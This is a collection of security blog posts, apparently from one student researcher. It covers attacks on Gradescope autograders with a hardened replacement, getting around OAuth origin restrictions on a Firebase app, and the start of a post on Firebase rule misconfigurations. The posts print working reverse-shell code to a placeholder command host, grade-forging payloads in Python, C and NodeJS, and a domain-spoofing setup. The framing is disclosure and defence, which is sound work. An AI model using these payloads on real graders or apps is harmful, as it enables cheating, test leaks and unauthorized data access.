[{"content":"Ever since I started exploring security more deeply, I\u0026rsquo;ve been asked countless times by people if I could hack into grading systems to change my (or, more often, their) grades. With Gradescope being the most ubiquitous platform for grading STEM classes at Stanford, my standard response was always that I couldn\u0026rsquo;t, imagining that a well-established EdTech company would secure their platform well enough.\nAs it turns out, Gradescope\u0026rsquo;s autograders have been vulnerable to various types of attack since 2016. Gradescope has known about the issues since at least 2020, yet has indicated it cannot distribute a general fix.\nThis post covers my exploration of Gradescope\u0026rsquo;s autograder vulnerabilities, an analysis of the potential impact on courses, and how I created Securescope, my attempt at a more secure autograder configuration.\nIntro: how Gradescope\u0026rsquo;s autograder works Gradescope uses short-lived Docker containers hosted on AWS to test and grade student code submissions. Every time a student submits code, Gradescope spins up a new Docker container used to score that submission.\nTo borrow Hanbang Wang\u0026rsquo;s graphic, the autograder flow is as follows:\nIn particular, there are three entities that we care about:\nGradescope autograder base code, which is distributed by Gradescope itself by being bundled with a base autograder Docker image. I\u0026rsquo;ll refer to this as base code for the remainder of the writeup. The relevant files are: /autograder/harness.py, the primary execution engine that controls environment configuration, runs the real autograder, and submits results to Gradescope\u0026rsquo;s servers. /autograder/update_and_run_harness.sh, which is the Docker container entrypoint that fetches the most up-to-date version of the harness from Gradescope\u0026rsquo;s AWS project and then runs it. Autograder client code, which is distributed by open-source autograder projects such as Otter. I\u0026rsquo;ll refer to this as client code. The relevant files are: /autograder/run_autograder, typically a shell script (but can be any executable) that does initial client environment configuration and then runs the client code tailored to the assignment. Execution is passed here from the harness. The language/assignment-specific autograder\u0026rsquo;s code can be located anywhere in /autograder, but is typically in /autograder/source. /autograder/results/results.json, which is computed by client code for the harness to submit to Gradescope\u0026rsquo;s servers. Student submissions, which I\u0026rsquo;ll refer to as student code. Typically, this is copied into /autograder/source by the client code. It should be noted that this entire chain runs as root, and that there is no network firewall imposed on any process \u0026ndash; neither within the Docker container, nor at the host level.\nAnother thing to note is that many autograder clients score student code by importing student code as a module, rather than by running the student code as a separate process (potentially with different user privileges) and using interprocess communication (IPC) to check test results. This means that student code often has access to autograder client code\u0026rsquo;s memory, and depending on the language, can easily access variables that would be otherwise out of scope (e.g. by using Python\u0026rsquo;s inspect.stack).\nFor more information, refer to Gradescope\u0026rsquo;s autograder documentation.\nExploring autograder vulnerabilities Within the above flow, Gradescope\u0026rsquo;s default autograder setup does not implement any kind of security restrictions and trusts arbitrary student code entirely.\nSince 2016, there have been a number of examples of how student code can abuse this trust:\nIn 2016, MIT students discovered that Gradescope does not limit network connections or file system access for student code; Gradescope also runs all submissions as root. In 2019, a UPenn student published a proof-of-concept method for changing one\u0026rsquo;s grade, modifying the run_autograder shell entrypoint to have arbitrary writes to results.json take final effect. In 2020, another writeup was published that demonstrated how to gain unrestricted access to the Docker container hosting an autograder by running a reverse shell from submitted code. This also allowed exfiltrating hidden test cases. Gradescope\u0026rsquo;s response to the 2020 writeup acknowledged these issues, but suggested it would be difficult to remediate any of the insecurities while maintaining compatiblility with most custom autograder client code.\nIn my February 2023 testing of Gradescope\u0026rsquo;s Ubuntu 22.04 base Docker image and an example Python calculator autograder, I was able to replicate and exploit each of the above vulnerabilities.\nFor my testing, I created a test course called RCE 101: Introduction to Remote Code Execution deploying Gradescope\u0026rsquo;s example Python calculator assignment and associated autograder client code.\nReverse shell and hidden test case exfiltration It\u0026rsquo;s not particularly difficult to get a root reverse shell on a Gradescope autograder Docker container. Since there is no firewall or other network request blocking on the Docker container or its host, we can make arbitrary outbound network requests, including creating reverse shells.\nAdditionally, the student runs as root, so the reverse shell will also inherit root privileges.\nStarting from the Python calculator official solution, all we need to do is add this code to the eval function \u0026ndash; a function we can predict will be run by the client code test suite:\ns.connect((\u0026quot;C2_HOST_IP\u0026quot;, C2_PORT)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) pty.spawn(\u0026quot;/bin/sh\u0026quot;) We also need to run a control-and-command (C2) server available on C2_HOST_IP:C2_PORT, which can be easily done with a cheap Digital Ocean droplet. Simply run the command nc -lk C2_PORT -vvv using a port such as 4444.\nThis also allows us to exfiltrate test cases that would otherwise be hidden (we know these are hidden test cases due to the presence of the visibility decorator controlling access before the assignment due date):\nEditing autograder results Since the client code\u0026rsquo;s output file /autograder/results/results.json is treated as a trusted source of truth, we can modify our own grades as long as our write to that file takes effect after the client code\u0026rsquo;s final write. In particular, we want to write the JSON string {\u0026quot;score\u0026quot;: 999.0} to the file.\nHanbang Wang\u0026rsquo;s 2019 blog post contained a proof-of-concept that appends a line to /autograder/run_autograder to write the above JSON string into the results JSON file. The idea is that because shell scripts execute lines immediately after reading them (rather than reading the entire script into memory before execution), appending to the shell script controlling the client autograder allows us to make changes even after the client exits.\nTo do this for our Python calculator, we simply add the following lines to our eval function:\njout = {'\u0026quot;score\u0026quot;': 999.0} with open(\u0026quot;/autograder/run_autograder\u0026quot;, \u0026quot;a\u0026quot;) as exout: exout.write(f\u0026quot;\\necho {json.dumps(jout)} \u0026gt; /autograder/results/results.json\u0026quot;) When submitting, this gives me 999% on the assignment:\nA simpler variation is to just directly write to results.json from student code, then attempt to close the client code\u0026rsquo;s file descriptor for that file:\njout = {\u0026quot;score\u0026quot;: 999.0} with open(\u0026quot;/autograder/results/results.json\u0026quot;, \u0026quot;w\u0026quot;) as exout: exout.write(json.dumps(jout)) os.closerange(0, 10) exit(0) This works and gives me 999% too.\nHowever, if neither of these paths were available, we could still perform the attack by attempting to write to results.json between when the autograder client code exits and when harness.py reads results.json. It\u0026rsquo;s possible, but difficult, to do this by simply polling the results.json file for the client code\u0026rsquo;s closing of that file. However, to avoid having to do such a timing attack, we can spawn a subprocess that uses inotify Linux kernel events to watch writes to the results.json file \u0026ndash; writing our own values to that file after an autograder write. To do this, here\u0026rsquo;s some C code that sets up the watcher and the associated action:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/inotify.h\u0026gt; #define BUFSZ 4 * sizeof(struct inotify_event) + 16 void main() { int fd = inotify_init(); int wd = inotify_add_watch( fd, \u0026quot;/autograder/results/results.json\u0026quot;, IN_CREATE | IN_MODIFY ); char events[BUFSZ]; int length = read(fd, events, BUFSZ); for (int i = 0; i \u0026lt; length;) { struct inotify_event *event = (struct inotify_event *) \u0026amp;events[i]; if ((event-\u0026gt;mask \u0026amp; IN_CREATE) || (event-\u0026gt;mask \u0026amp; IN_MODIFY)) { const char *output = \u0026quot;{\\\u0026quot;score\\\u0026quot;: 999.0}\u0026quot;; FILE *fp = fopen(\u0026quot;/autograder/results/results.json\u0026quot;, \u0026quot;w\u0026quot;); fprintf(fp, output); } i += sizeof(struct inotify_event) + event-\u0026gt;len; } } We then simply stick this into Python, calling subprocesses to compile and run the C watcher:\nc_payload = \u0026quot;\u0026quot;\u0026quot; PASTE_ABOVE_C_HERE \u0026quot;\u0026quot;\u0026quot; with open(\u0026quot;/autograder/source/write_inotify.c\u0026quot;, \u0026quot;w\u0026quot;) as cout: cout.write(c_payload) subprocess.call( [ \u0026quot;gcc\u0026quot;, \u0026quot;/autograder/source/write_inotify.c\u0026quot;, \u0026quot;-o\u0026quot;, \u0026quot;/autograder/source/write_inotify\u0026quot;, ], stderr=subprocess.DEVNULL, ) subprocess.Popen([\u0026quot;/autograder/source/write_inotify\u0026quot;], start_new_session=True) This, again, gives me a 999%.\nImpact The impact of these vulnerabilities are severe. With the ability to run arbitrary code as root, it\u0026rsquo;s easy for students to change their own grades. Perhaps more problematically, students can leak hidden test cases intended to be reused across years. Depending on the application, it might be difficult or time-consuming for instructors to rewrite tests in response to the leaks.\nThe mitigating factor is that Gradescope separately logs all code submissions independently of the autograder flow. Thus, instructors can easily discover malicious student code, and since source code is submitted rather than code binaries, students cannot truly hide such malicious code snippets. Indeed, this was part of Gradescope\u0026rsquo;s response when they were informed about these vulnerabilities in 2020:\nAlso, you likely are aware, but if a student were to do this, they would not be able to hide it, because they can’t edit their submission after the fact, meaning you could discover this and pursue severe disciplinary action against them if needed.\nThat being said, there are many situations where manually reading student code might not be feasible \u0026ndash; for example, large courses. At Stanford, the CS 224N: Natural Language Processing with Deep Learning course has 647 enrolled students at the time of writing. With 26 teaching assistants, each TA would have to grade roughly 25 students\u0026rsquo; submissions per assignment, which is doable if only the final submission needs to be read.\nHowever, in the hidden test case exfiltration scenario, a student could simply make a submission that exfiltrates the test cases, then make a number of legitimate submissions to bury the malicious one in the list of their submissions. Since students are generally encouraged to repeatedly submit intermediate drafts of their code (so that partial credit can be assessed even if they don\u0026rsquo;t finish the assignment on time), a high number of submissions may not look suspicious.\nIf TAs had to read through each student submission, then it\u0026rsquo;s conceivable that an individual TA might have to read through hundreds of submissions for a class as large as CS 224N, which is unsustainable. But if TAs only look at each student\u0026rsquo;s final submission, they would not be able to catch the malicious code.\nThis creates a need for an autograder that is at least resistant to the most obvious cases of malicious student code. While Gradescope indicated in 2020 that they were looking into a solution that would cut off network access to student code, clearly that fix has not been implemented yet.\nThis motivated my decision to create my own hardened autograder base.\nSecurescope: a more secure autograder Gradescope claims difficulty in creating more secure autograder base images that integrate well with existing clients. I don\u0026rsquo;t think this is an adequate excuse to not offer any security features for clients to take advantage of.\nMy solution, Securescope, is a base image that provides security features that autograder clients can use to defend against these common attacks. For more technical details, refer to the Securescope documentation, but in summary, Securescope can:\nRun student code as a deprivileged student user This prevents student code from writing to run_autograder in order to change results.json before submission Block network requests by using seccomp to prevent student code making socket system calls that connect to IP addresses This prevents reverse shells and hidden test case exfiltration Securescope needs to use seccomp here because the Docker container doesn\u0026rsquo;t run with sufficient capabilities to use a standard iptables-based firewall This would be more robust if Gradescope implemented a host-level firewall with iptables, but obviously this has not been done Note that there could be some other side-channel attack that leaks some information about the test cases, but what can be leaked given how Gradescope\u0026rsquo;s frontend appears to the user is reasonably low Verify result integrity by having client code include a provided nonce in the results.json file that is only added after student code is run This prevents student code from crashing client code to have its write to run_autograder take effect Use seccomp to prevent student code from using inotify kernel watchers to write to results.json after client code exits These features are switched off by default such that client autograders can simply inherit their Docker base from Securescope without any change in functionality from using Gradescope\u0026rsquo;s base Docker image. The security features can be toggled on using environment variables and minimal additions to client code.\nWhen client code uses each of these features effectively, this addresses all of my above demonstrated attacks. There are certainly remaining exploitable attack surfaces past these mitigations. True security is only possible when client code and student code are run by different processes with different user privileges.\nTesting Beyond testing Securescope with the example Python calculator assignment, I also subjected Securescope to a more real-world test. Having taken the CS 255 Introduction to Cryptography course at Stanford last year, I was able to get access to that course\u0026rsquo;s autograder client code (with TA permission) for a project implementing a simple password manager in NodeJS. I then replaced the autograder base image with Securescope, turning on and integrating each of the security features into the autograder client code (which only took about 20 minutes).\nIn addition to testing the official solution and my own submission from last year, I also collected submissions from a few friends who took the course this and last year and uploaded those to the Securescope-integrated autograder. Each submission yielded the same results on Securescope as when originally scored with the default autograder.\nTo validate the efficacy of Securescope\u0026rsquo;s security features on this assignment, I rewrote some earlier attacks in NodeJS, then uploaded them to test:\n// reverse shell (function() { var net = require(\u0026quot;net\u0026quot;), cp = require(\u0026quot;child_process\u0026quot;), sh = cp.spawn(\u0026quot;/bin/sh\u0026quot;, []); var client = new net.Socket(); client.connect(C2_PORT, C2_HOST, function() { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })(); The above attack was prevented by the seccomp IP socket syscall blocker:\n// result modification via closing file descriptors const { writeFileSync, closeSync } = require('fs'); writeFileSync(\u0026quot;/autograder/results/results.json\u0026quot;, \u0026quot;{\\\u0026quot;score\\\u0026quot;: 999.0}\u0026quot;); for (var i = 0; i \u0026lt; 10; i++) { try { closeSync(i); } catch (err) { continue; } } process.exit(0); This attack was prevented by the nonce verification process:\nHaving tested Securescope\u0026rsquo;s additional security features against attacks written in both Python and NodeJS, I now feel more confident making claims about Securescope\u0026rsquo;s security properties.\nConclusion Gradescope\u0026rsquo;s default autograder configuration provides no security features by default, allowing all sorts of attacks including test case exfiltration and grade modification. Gradescope has known this for several years, but has claimed that providing a general-purpose fix is too difficult.\nSecurescope aims to provide certain security features that are missing from the default autograder configuration. As true security requires restructuring autograder client code to only run student code across a process boundary, Securescope does not completely eliminate the possibility of all attacks. However, using Securescope raises the effort required for students to exploit the autograder to change their grades or to exfiltrate hidden test cases.\nThe hope is that Securescope can give existing client code some security benefits with minimal modification. Client autograders can use Securescope as an intermediate solution while working to separate student code execution across a process boundary.\nAcknowledgements: Thanks to George Hosono for the idea to test Gradescope\u0026rsquo;s security, insights on Gradescope and Docker, and for letting me test the CS255 autograder. Thanks to Glen Husman, Nathan Bhak, and Kelechi Uhegbu for letting me test their CS255 project submissions. Thanks to Glen Husman and Miles McCain for edits and suggestions.\n","date":"2023-02-28","permalink":"https://saligrama.io/blog/post/gradescope-autograder-security/","tags":[],"title":"A student's dream: hacking (then fixing) Gradescope's autograder"},{"content":"In my last post, I covered the marvelous world of Firebase database spelunking: when app developers misconfigure their Firestore security rules, the resulting ability to perform unauthorized data accesses can lead to terrifying data breaches for those apps. Thanks to tools like Baserunner, testing apps for such misconfigurations is easier than ever.\nBy saving authorization state when logging into Firebase databases using email/password or phone/OTP sign-in methods, Baserunner lets you focus on actually querying the database for data. However, what happens when client apps only allow sign-in using a Google account?\nThis blog post covers how Glen Husman and I conducted security testing of such a Firebase client app, using a clever solution to grab the Google OAuth token to sign into the database with. I then used lessons learned from that engagement to contribute Google sign-in functionality back to Baserunner.\nConducting security testing on a Google OAuth-only Firebase app The motivation for this exploration was a security inspection that Glen Husman and I conducted in February 2022 on a Stanford student-created website that stored some moderately sensitive user data. The site was a Javascript single-page application (SPA) backed by a Firebase database that only allowed Google sign-in via Firebase authentication.\nWe found minor issues relating to Firebase security rule misconfigurations leading to some unauthorized data accesses. We disclosed these vulnerabilities on February 27, 2022 and received confirmation that they had been fixed on March 28, 2022.\nTo respect the student\u0026rsquo;s and app\u0026rsquo;s request for anonymity, I won\u0026rsquo;t disclose any further details about the engagement, and the examples I use will relate to a demo app I created solely for this post.\nA brief background on OAuth OAuth is an protocol meant to delegate access between applications that decouples authentication from authorization. That is, the identity and authorization provider (e.g., Google) can be a different entity from the application the user is actually logging into (e.g., Notion). Furthermore, OAuth usage can be scoped to allow the requesting application to access data owned by the identity provider.\nOAuth vocabulary and basic flow Client Application/Relying Party: An application which receives delegated authorized access from another server, or relies on another server for authentication. In our case, the Firebase database. Authorization Server/Identity Provider (IdP): Server that conducts a sign-in flow that allows the user to authenticate, and on which the user consents to authorizing the app. In our case, Google. OAuth 2.0: An authorization standard. Client apps prompt for authorization and receive an opaque access token to access a resource (identified by \u0026ldquo;scopes\u0026rdquo;). OpenID Connect (OIDC): An authentication standard built on OAuth 2, used by Sign In With Google and other protocols. This extends OAuth to return a verifiable ID token making authentication claims (e.g. user Aditya Saligrama owns email address aditya@saligrama.io), in addition to the access token. To explain the flow as simply as possible, a client application will make a request to the identity provider, which opens a popup window or browser tab containing the sign-in flow for the identity provider. A user will then sign into their account with the identity provider, which then provides the client a scoped token to identify the user, and, if necessary, to access data from the identity provider. The client can then pass the token or a derivative thereof to the user\u0026rsquo;s browser, which is then included on subsequent requests to the client for resource authorization.\nFor more information, refer to this blog post by Okta and the official OAuth documentation.\nOAuth security flows Here\u0026rsquo;s a potential security problem with OAuth: suppose that our favorite example banking site https://bank.com supports logging in with OAuth using Google as an authentication provider. When a user (Alice) goes through the Google sign-in flow on bank.com, bank.com is provided a token used to authorize access to Alice\u0026rsquo;s data on bank.com, which is then passed to her browser.\nNow suppose Alice received a phishing email leading them to click on https://b4nk.com, a phishing site that looks exactly the same as bank.com. Just like the legitimate bank site, Alice is asked to sign in with Google. If b4nk.com uses its own client ID for Google sign-in, then all is well, as the scoped token that is returned only allows access to data on b4nk.com.\nHowever, suppose b4nk.com identifies itself to Google as bank.com using the latter\u0026rsquo;s public client ID. If the flow completes successfully, then b4nk.com has successfully obtained a token for Alice\u0026rsquo;s account on bank.com, which can then be used to access Alice\u0026rsquo;s banking data. This is a clear security violation, and should not be allowed to happen!\nThus, applications themselves must have some way of authenticating themselves to the identity provider such that only legitimate applications can request access tokens for their sites.\n3-legged flow A traditional web application will typically feature a client and a dedicated application server; the three \u0026ldquo;legs\u0026rdquo; are the user\u0026rsquo;s browser (and therefore the frontend client), the application server, and the authorization (IdP) server. This means that the application server is capable of holding secrets that can be used to authenticate the application itself to the identity provider.\nWhen an OAuth sign-in flow is conducted, the application will pass along its client secret to the identity provider, which will only return the access token if the client secret can be verified.\n2-legged flow In contrast, a JS SPA is a case where all requests are made from the user\u0026rsquo;s browser; i.e. there is no application server that can hold a client secret. But such an application can still fall prey to the phishing attack mentioned earlier.\nThus, to ensure that only legitimate applications can obtain a user access token, the identity provider can enforce a restriction on what origin the sign-in flow request can come from. Typically, these origins are configurable when setting up OAuth with the identity provider.\nTo cite Zakir Durumeric\u0026rsquo;s excellent web security lecture from Stanford\u0026rsquo;s CS 155 Computer and Network Security course, an origin is defined as a unique scheme://domain:port tuple. To illustrate:\nThe following are different origins: http://saligrama.io http://www.saligrama.io http://saligrama.io:8080 https://saligrama.io The following are the same origin: https://saligrama.io https://saligrama.io:443 https://saligrama.io/blog This effectively stops the phishing attack: https://b4nk.com is a different origin than https://bank.com, so the identity provider can block the request rather than responding with an access token.\nSigning into a Firebase database with Google OAuth For more details on exploiting Firebase misconfigurations, including a case study, please refer to my last post.\nThe Firebase OAuth sign-in flow Recall that to make requests against a Firebase database, we need a set of API tokens found on the client side, as well as an authorization header. For an SPA, the former is easily found by inspecting the minified JS source code of the page.\nHowever, the authorization header depends on the sign-in method. When using email/password authentication, the email and password are passed directly to Firebase\u0026rsquo;s authentication server, which then returns the authorization header.\nSimilarly, with phone/OTP authentication, the phone number is passed to Firebase\u0026rsquo;s authentication server, which then sends an OTP to the phone. This OTP is then entered on the client side, passed back to the Firebase authentication server, which then returns the authorization header.\nBut with Google OAuth sign-in, the process is a little more complicated:\nThe client makes a request to Google\u0026rsquo;s OAuth server including the site\u0026rsquo;s Google client ID. The Google OAuth server conducts the user-facing sign-in flow, either listing Google accounts already logged in on the browser to use, or requesting email/password/MFA (if applicable). The Google server then checks if the requesting client\u0026rsquo;s origin is registered under the Google developer project for Google sign-in. If not, an origin mismatch error is shown to the user. An OAuth token is then returned to the client. For SPAs, these tokens typically expire after one hour. The Firebase app consumes the OAuth token to create an authorization header for the corresponding database. As Baserunner did not support this flow when Glen and I first investigated a Google OAuth-only Firebase client app, we had to cobble this together ourselves.\nDemo setup To demonstrate this process, I created a demo Firebase project that only accepts Google sign-in. Note that I\u0026rsquo;ve taken this down by now, so trying to hit this endpoint will get you nowhere. The API tokens were as follows; again, you can find these from the JS source code of an SPA.\n{ \u0026quot;apiKey\u0026quot;: \u0026quot;AIzaSyAcfgDIqP8NuzNctjznZELFfvW3wGw8YcU\u0026quot;, \u0026quot;authDomain\u0026quot;: \u0026quot;saligrama-oauth-demo.firebaseapp.com\u0026quot;, \u0026quot;projectId\u0026quot;: \u0026quot;saligrama-oauth-demo\u0026quot;, \u0026quot;storageBucket\u0026quot;: \u0026quot;saligrama-oauth-demo.appspot.com\u0026quot;, \u0026quot;messagingSenderId\u0026quot;: \u0026quot;915380107062\u0026quot;, \u0026quot;appId\u0026quot;: \u0026quot;1:915380107062:web:39f937f22655442c46a597\u0026quot; } I then created a user account for the project backed by my Google account (aditya@saligrama.io), as well as some test data in Cloud Firestore to be queried for.\nThe objective here is to get the Google OAuth token for aditya@saligrama.io corresponding to the demo app that can then produce a Firebase authorization header. This can then be used in a Node.js script to query the database.\nAttempt 1: running a local web server As OAuth is a communication protocol between web applications, we need to actually be running a web server to try to get the OAuth token. Let\u0026rsquo;s use the simplest possible option: Python\u0026rsquo;s http.server module, serving a simple HTML and Javascript page.\n\u0026lt;!-- index.html --\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta name=\u0026quot;google-signin-cookiepolicy\u0026quot; content=\u0026quot;single_host_origin\u0026quot;\u0026gt; \u0026lt;meta name=\u0026quot;google-signin-scope\u0026quot; content=\u0026quot;openid https://www.googleapis.com/auth/userinfo.email profile\u0026quot;\u0026gt; \u0026lt;script src=\u0026quot;googleauth_import.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- Script providing the Google sign-in functionality --\u0026gt; \u0026lt;!-- Note: callback function for Google sign-in needs to be in a separate file --\u0026gt; \u0026lt;!-- Contains Client ID for saligrama-oauth-demo --\u0026gt; \u0026lt;script src=\u0026quot;https://accounts.google.com/gsi/client\u0026quot; async defer\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;div id=\u0026quot;g_id_onload\u0026quot; data-client_id=\u0026quot;915380107062-5500mntg10so5r623ga9c6nq6tdjv36r.apps.googleusercontent.com\u0026quot; data-callback=\u0026quot;onSignIn\u0026quot;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;g_id_signin\u0026quot; data-type=\u0026quot;standard\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; // googleauth_import.js function onSignIn(googleUser) { console.log(googleUser); } When the sign-in is successful, we should expect to see the Google sign-in info printed in the console.\nRun the server:\n❯ python3 -m http.server -d http-root -b 127.0.0.1 8080 Serving HTTP on 127.0.0.1 port 8080 (http://127.0.0.1:8080/) ... This loads a page with a Google sign-in button, as expected:\nClicking on the button yields a pop-up with the Google sign-in flow; after succesfully signing in with aditya@saligrama.io, the pop-up abruptly closes. Checking the console, we see the following:\nClearly, the issue was with the domain we were loading: http://localhost:8080 is not a registered origin for the demo app. We\u0026rsquo;ve run up against the aforementioned origin restriction issue! Let\u0026rsquo;s try using the Firebase project\u0026rsquo;s domain itself.\nAttempt 2: domain-jacking We now want to use saligrama-oauth-demo.firebaseapp.com as the domain. While this is a host with its own public IP address (199.36.158.100 at the time of writing), we can tell our local machine to point the hostname to any IP address of our choosing (including the local host, 127.0.0.1).\nThis is done by editing the hosts file, adding a line containing the following:\n127.0.0.1 saligrama-oauth-demo.firebaseapp.com On Linux and macOS: /etc/hosts On Windows: C:\\Windows\\system32\\drivers\\etc\\hosts Recalling that an origin is comprised of a scheme, a host, and a port, we should probably also run the web server on port 80, which requires administrator permissions on Linux:\n❯ sudo python3 -m http.server -d http-root -b 127.0.0.1 80 Serving HTTP on 127.0.0.1 port 80 (http://127.0.0.1:80/) ... Now, we load this in our web browser, conduct the sign-in flow, and check the console:\nAnother failure. Maybe changing the scheme and port, using HTTPS over port 443, will help.\nAttempt 3: HTTPS, where the S stands for Success Running a HTTPS server requires a little more legwork. First, we need to generate a self-signed SSL certificate:\n❯ openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \\ -keyout server.pem -out server.pem \\ -subj \u0026quot;/CN=saligrama-oauth-demo.firebaseapp.com\u0026quot; \\ -addext \u0026quot;subjectAltName=DNS:saligrama-oauth-demo.firebaseapp.com\u0026quot; We then need to actually allow our Python HTTP server to serve over HTTPS; a light modification to this GitHub Gist suffices:\nimport http.server import ssl server_address = (\u0026quot;0.0.0.0\u0026quot;, 443) class CORSHTTPRequestHandler(http.server.SimpleHTTPRequestHandler): extensions_map = { \u0026quot;\u0026quot;: \u0026quot;application/octet-stream\u0026quot;, \u0026quot;.manifest\u0026quot;: \u0026quot;text/cache-manifest\u0026quot;, \u0026quot;.html\u0026quot;: \u0026quot;text/html\u0026quot;, \u0026quot;.png\u0026quot;: \u0026quot;image/png\u0026quot;, \u0026quot;.jpg\u0026quot;: \u0026quot;image/jpg\u0026quot;, \u0026quot;.svg\u0026quot;: \u0026quot;image/svg+xml\u0026quot;, \u0026quot;.css\u0026quot;: \u0026quot;text/css\u0026quot;, \u0026quot;.js\u0026quot;: \u0026quot;application/x-javascript\u0026quot;, \u0026quot;.wasm\u0026quot;: \u0026quot;application/wasm\u0026quot;, \u0026quot;.json\u0026quot;: \u0026quot;application/json\u0026quot;, \u0026quot;.xml\u0026quot;: \u0026quot;application/xml\u0026quot;, } def end_headers(self): # Include additional response headers here. CORS for example: self.send_header(\u0026quot;Access-Control-Allow-Origin\u0026quot;, \u0026quot;*\u0026quot;) self.send_header(\u0026quot;Cross-Origin-Opener-Policy\u0026quot;, \u0026quot;same-origin-allow-popups\u0026quot;) self.send_header(\u0026quot;Cross-Origin-Embedder-Policy\u0026quot;, \u0026quot;require-corp\u0026quot;) http.server.SimpleHTTPRequestHandler.end_headers(self) httpd = http.server.HTTPServer(server_address, CORSHTTPRequestHandler) ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER) ctx.check_hostname = False ctx.load_cert_chain(certfile=\u0026quot;../server.pem\u0026quot;) # with key inside httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True) httpd.serve_forever() Run the server:\n❯ sudo python3 simple-https-server.py Naturally, as the certificate is self-signed, Firefox throws a warning that can be bypassed. In some cases, if you\u0026rsquo;ve already navigated to https://PROJECT_ID.firebaseapp.com, your browser will actually refuse to let you see the self-hosted page due to HSTS settings. HSTS is a policy that stores HTTPS certificates associated with websites and prevents users from accessing those websites again if the certificate does not match the stored one.\nIn this case, you\u0026rsquo;ll need to clear HSTS settings by clearing all data associated with the site from your browser.\nWe again go through the Google sign-in flow and check the console, which yields the token!\nI should note that I\u0026rsquo;ve seen some projects follow Firebase default settings to allow http://localhost (port 80) as an origin, which would shortcut the hostname and certificate process. However, I\u0026rsquo;ve also seen projects remove localhost as an acceptable origin once in production, so it\u0026rsquo;s more reliable to use the actual Firebase project\u0026rsquo;s domain over HTTPS as above.\nQuerying for data Now that we have the token, we can query the Firebase database for data using a Node.js script, similar to the example from my last post.\n// oauth-demo.mjs import { initializeApp } from 'firebase/app'; import { getFirestore, doc, getDoc } from 'firebase/firestore/lite'; import { getAuth, signInWithCredential, GoogleAuthProvider } from \u0026quot;firebase/auth\u0026quot;; const firebaseConfig = { apiKey: \u0026quot;AIzaSyAcfgDIqP8NuzNctjznZELFfvW3wGw8YcU\u0026quot;, authDomain: \u0026quot;saligrama-oauth-demo.firebaseapp.com\u0026quot;, projectId: \u0026quot;saligrama-oauth-demo\u0026quot;, storageBucket: \u0026quot;saligrama-oauth-demo.appspot.com\u0026quot;, messagingSenderId: \u0026quot;915380107062\u0026quot;, appId: \u0026quot;1:915380107062:web:39f937f22655442c46a597\u0026quot; }; const app = initializeApp(firebaseConfig); const db = getFirestore(app); const auth = getAuth(); const id_token = \u0026quot;PASTE_OAUTH_TOKEN_HERE\u0026quot;; const credential = GoogleAuthProvider.credential(id_token); signInWithCredential(auth, credential) .then((_) =\u0026gt; { let docRef = doc(db, \u0026quot;test\u0026quot;, \u0026quot;EsjmpXTOSnAb9o6JZufF\u0026quot;); getDoc(docRef).then(x =\u0026gt; { console.log(x.data()); } ); }) .catch((error) =\u0026gt; { console.error(error); }); Running the script, we get the desired data.\n❯ node oauth-demo.mjs { message: 'Spooky scary user data, send shivers down your spine' } Contributing to Baserunner Coincidentally, the lack of Google sign-in support was an open issue in Baserunner for nearly 18 months. With what I\u0026rsquo;d learned from this engagement, I was able to add this support to Baserunner. This required adding a way to set the Google client ID on the frontend and dynamically generating a Google sign-in button based on that input client ID, then plumbing the resulting credential through to the saved Firebase state for login.\nMy pull request was merged in August 2022. We can now use Baserunner to query for the data!\nConclusion While Google sign-in can make it more difficult to sign into Firebase databases for exploratory purposes outside the official app context, it\u0026rsquo;s not impossible, as this work shows. Bypassing the origin restriction enforced by the Firebase authentication requires some finagling, but I hope this post serves as a guide on how to do so.\nWith mainline Baserunner support for Google sign-in added by my pull request, exploring Firebase databases has never been easier.\n","date":"2022-11-23","permalink":"https://saligrama.io/blog/post/dodging-oauth-origin-restrictions/","tags":[],"title":"Dodging OAuth origin restrictions for Firebase spelunking"},{"content":"By shifting the data authorization and access restriction burden from robust programmatic systems running on a server to static security rules, backend-as-a-service platforms like Google Firebase put new app developers and their products at risk of catastrophic data breaches if utmost care is not paid to the efficacy of these rules.\nThis blog post details how to find such vulnerabilities in apps using Firebase as a backend. I also tell the story of one such vulnerability I found (along with Miles McCain and Cooper de Nicola) in Fizz, a popular anonymous posting platform at Stanford and other universities. Fizz\u0026rsquo;s improper handling of Firebase security rules allowed full deanonymization of all posts down to email and/or phone number and unauthorized granting of moderator permissions.\nLastly, I talk about legal threats we received in the course of disclosing these vulnerabilities.\nIntro With software and programming starting to become almost a lingua franca of today’s world, the state of tooling for app development has become better and better in recent years in terms of usability for new developers. One such tool is Firebase, Google’s flagship “backend-as-a-service” app platform.\nFirebase’s big selling point for early-stage app development is that it abstracts away the need to write a full backend and maintain one’s own database. Firebase can handle authentication (including MFA and SSO solutions) and its document-structured Cloud Firestore (CFS) and Realtime Database (RTDB) datastore offerings allow significant flexibility in terms of the data they can store. This is extremely appealing to developers in an early or prototyping stage as data models can change frequently.\nFirebase and data security As Firebase serves as the backend itself, clients such as web and mobile apps connect directly to both the authentication system and to the datastore itself using a set of API keys that are distributed with every client instance (i.e., every app download has the same set of Firebase API keys embedded in it). There is no programmatic authorization system for restricting which clients can see what data, as there would be in a traditional client-server-database model.\nInstead, data access limitations are configured in the admin view using JSON-based security rules, which allows developers to specify which classes of users are allowed to read or write to and from each data path. When data models start to involve any modicum of complexity, configuring these security rules to properly restrict unauthorized access to data gets tricky. From Firebase\u0026rsquo;s documentation:\nRules are applied as OR statements, not AND statements. Consequently, if multiple rules match a path, and any of the matched conditions grants access, Rules grant access to the data at that path. Therefore, if a broad rule grants access to data, you can\u0026rsquo;t restrict with a more specific rule. You can, however, avoid this problem by making sure your Rules don\u0026rsquo;t overlap too much. Firebase Security Rules flag overlaps in your matched paths as compiler 